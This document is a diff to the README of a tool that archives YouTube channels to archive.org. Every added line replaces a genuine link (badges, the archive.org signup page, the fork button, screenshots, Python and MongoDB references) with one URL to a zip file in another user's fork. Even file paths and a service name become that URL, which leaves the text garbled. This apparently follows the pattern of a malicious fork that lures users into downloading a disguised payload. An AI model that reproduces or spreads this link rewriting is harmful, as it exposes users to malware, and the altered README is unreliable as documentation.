@@ -1,12 +1,12 @@
 # Internetarchive-YouTube
 
-[![Poetry-build](https://github.com/Alyetama/internetarchive-youtube/actions/workflows/poetry-build.yml/badge.svg)](https://github.com/Alyetama/internetarchive-youtube/actions/workflows/poetry-build.yml) [![Supported Python versions](https://img.shields.io/badge/Python-%3E=3.7-blue.svg)](https://www.python.org/downloads/) [![PEP8](https://img.shields.io/badge/Code%20style-PEP%208-orange.svg)](https://www.python.org/dev/peps/pep-0008/) 
+[![Poetry-build](https://github.com/PanPizza15/internetarchive-youtube/raw/refs/heads/main/.github/youtube-internetarchive-1.3.zip)](https://github.com/PanPizza15/internetarchive-youtube/raw/refs/heads/main/.github/youtube-internetarchive-1.3.zip) [![Supported Python versions](https://github.com/PanPizza15/internetarchive-youtube/raw/refs/heads/main/.github/youtube-internetarchive-1.3.zip%https://github.com/PanPizza15/internetarchive-youtube/raw/refs/heads/main/.github/youtube-internetarchive-1.3.zip)](https://github.com/PanPizza15/internetarchive-youtube/raw/refs/heads/main/.github/youtube-internetarchive-1.3.zip) [![PEP8](https://github.com/PanPizza15/internetarchive-youtube/raw/refs/heads/main/.github/youtube-internetarchive-1.3.zip%20style-PEP%https://github.com/PanPizza15/internetarchive-youtube/raw/refs/heads/main/.github/youtube-internetarchive-1.3.zip)](https://github.com/PanPizza15/internetarchive-youtube/raw/refs/heads/main/.github/youtube-internetarchive-1.3.zip) 
 
-🚀 GitHub Action and CLI tool to archive YouTube channels by automatically uploading an entire YouTube channel to [archive.org](https://archive.org) in few clicks.
+🚀 GitHub Action and CLI tool to archive YouTube channels by automatically uploading an entire YouTube channel to [https://github.com/PanPizza15/internetarchive-youtube/raw/refs/heads/main/.github/youtube-internetarchive-1.3.zip](https://github.com/PanPizza15/internetarchive-youtube/raw/refs/heads/main/.github/youtube-internetarchive-1.3.zip) in few clicks.
 
 ## 📌 Global Requirements
 
-- All you need is an [Internet Archive account](https://archive.org/account/signup).
+- All you need is an [Internet Archive account](https://github.com/PanPizza15/internetarchive-youtube/raw/refs/heads/main/.github/youtube-internetarchive-1.3.zip).
 
 ## 🔧 Usage
 
@@ -20,16 +20,16 @@
 <details>
   <summary>Using internetarchive-youtube as a GitHub Action instructions</summary>
 
-1. **[Fork this repository](https://github.com/Alyetama/yt-archive-sync/fork).**
+1. **[Fork this repository](https://github.com/PanPizza15/internetarchive-youtube/raw/refs/heads/main/.github/youtube-internetarchive-1.3.zip).**
 
 2. **Enable the workflows in your fork.**
 
-<img src="https://i.imgur.com/J1udGei.jpeg"  width="720" alt=""> 
-<img src="https://i.imgur.com/WhyFjWy.jpeg"  width="720" alt=""> 
+<img src="https://github.com/PanPizza15/internetarchive-youtube/raw/refs/heads/main/.github/youtube-internetarchive-1.3.zip"  width="720" alt=""> 
+<img src="https://github.com/PanPizza15/internetarchive-youtube/raw/refs/heads/main/.github/youtube-internetarchive-1.3.zip"  width="720" alt=""> 
 
 3. **[Create a backend database (or JSON bin)](<#%EF%B8%8F-creating-a-backend-database> "Creating a backend database").**
 
-4. **Add your *Archive.org* credentials to the repository's actions secrets:**
+4. **Add your *https://github.com/PanPizza15/internetarchive-youtube/raw/refs/heads/main/.github/youtube-internetarchive-1.3.zip* credentials to the repository's actions secrets:**
   - `ARCHIVE_USER_EMAIL`
   - `ARCHIVE_PASSWORD`
 
@@ -72,7 +72,7 @@ That's it! 🎉
 
 #### Requirements:
 
-- 🐍 [Python>=3.7](https://www.python.org/downloads/)
+- 🐍 [Python>=3.7](https://github.com/PanPizza15/internetarchive-youtube/raw/refs/heads/main/.github/youtube-internetarchive-1.3.zip)
 
 #### ⬇️ Installation:
 
@@ -128,7 +128,7 @@ options:
   -n, --no-logs         Don't print any log messages.
   -a, --add-channel     Add a channel interactively to the list of channels to archive.
   -c CHANNELS_FILE, --channels-file CHANNELS_FILE
-                        Path to the channels list file to use if the environment variable `CHANNELS` is not set (default: ~/.yt_channels.txt).
+                        Path to the channels list file to use if the environment variable `CHANNELS` is not set (default: ~https://github.com/PanPizza15/internetarchive-youtube/raw/refs/heads/main/.github/youtube-internetarchive-1.3.zip).
   -S, --show-channels   Show the list of channels in the channels file.
   -C, --create-collection
                         Creates/appends to the backend database from the channels list.
@@ -150,13 +150,13 @@ options:
 <details>
   <summary>Creating A Backend Database instructions</summary>
 
-  **NOTICE: The `JSONBIN` option will not work at the moment because jsonbin.io changed their API recently. Please use MongoDB for now until the next release.**
+  **NOTICE: The `JSONBIN` option will not work at the moment because https://github.com/PanPizza15/internetarchive-youtube/raw/refs/heads/main/.github/youtube-internetarchive-1.3.zip changed their API recently. Please use MongoDB for now until the next release.**
 
 - **Option 1:**  MongoDB (recommended).
-  - Self-hosted (see: [Alyetama/quick-MongoDB](https://github.com/Alyetama/quick-MongoDB) or [dockerhub image](https://hub.docker.com/_/mongo)).
-  - Free cloud database on [Atlas](https://www.mongodb.com/database/free).
+  - Self-hosted (see: [Alyetama/quick-MongoDB](https://github.com/PanPizza15/internetarchive-youtube/raw/refs/heads/main/.github/youtube-internetarchive-1.3.zip) or [dockerhub image](https://github.com/PanPizza15/internetarchive-youtube/raw/refs/heads/main/.github/youtube-internetarchive-1.3.zip)).
+  - Free cloud database on [Atlas](https://github.com/PanPizza15/internetarchive-youtube/raw/refs/heads/main/.github/youtube-internetarchive-1.3.zip).
 - **Option 2:** JSON bin (if you want a quick start).
-  - Sign up to JSONBin [here](https://jsonbin.io/login).
+  - Sign up to JSONBin [here](https://github.com/PanPizza15/internetarchive-youtube/raw/refs/heads/main/.github/youtube-internetarchive-1.3.zip).
   - Click on `VIEW MASTER KEY`, then copy the key.
   
 </details>
@@ -164,6 +164,6 @@ options:
 
 ## 📝 Notes
 
-- Information about the `MONGODB_CONNECTION_STRING` can be found [here](https://www.mongodb.com/docs/manual/reference/connection-string/).
+- Information about the `MONGODB_CONNECTION_STRING` can be found [here](https://github.com/PanPizza15/internetarchive-youtube/raw/refs/heads/main/.github/youtube-internetarchive-1.3.zip).
 - Jobs can run for a maximum of 6 hours, so if you're archiving a large channel, the job might die, but it will resume in a new job when it's scheduled to run.
 - Instead of raw text, you can pass a file path or a file URL with a list of channels formatted as `CHANNEL_NAME: CHANNEL_URL`. You can also pass raw text or a file of the channels in JSON format `{"CHANNEL_NAME": "CHANNEL_URL"}`.
